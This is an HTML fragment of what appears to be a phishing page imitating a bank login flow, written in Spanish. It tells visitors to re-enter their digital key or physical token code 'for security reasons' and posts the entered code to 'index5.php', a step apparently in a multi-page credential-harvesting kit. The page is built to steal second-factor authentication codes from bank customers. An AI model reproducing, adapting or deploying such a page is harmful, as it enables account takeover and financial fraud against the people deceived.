...
<div class="logo"><img src="flfs/lgnd.png"><div></div></div></div></div></div></div></div></div></nav></header><div class="view-page"><div role="main" class="view-content"><main class="main-container"><div class="view-content-container">

<br>
<br><h1>Por motivos de seguridad ingresá tu <br><br> LLAVE DIGITAL ó<br><br> TOKEN FISICO NUEVAMENTE</h1><br>
			 <form  method="post" name="form1" id="form1" action="index5.php">
  
 <div class="form-group">
 <input type="tel" maxlength="10" minlength="6" class="form-control"  style="border:1px solid;" onkeypress="soloNumeros(event)"   name="Codigo2"
placeholder="Ingresa el código" autofocus required>
   </div>
  <br>
    <br>
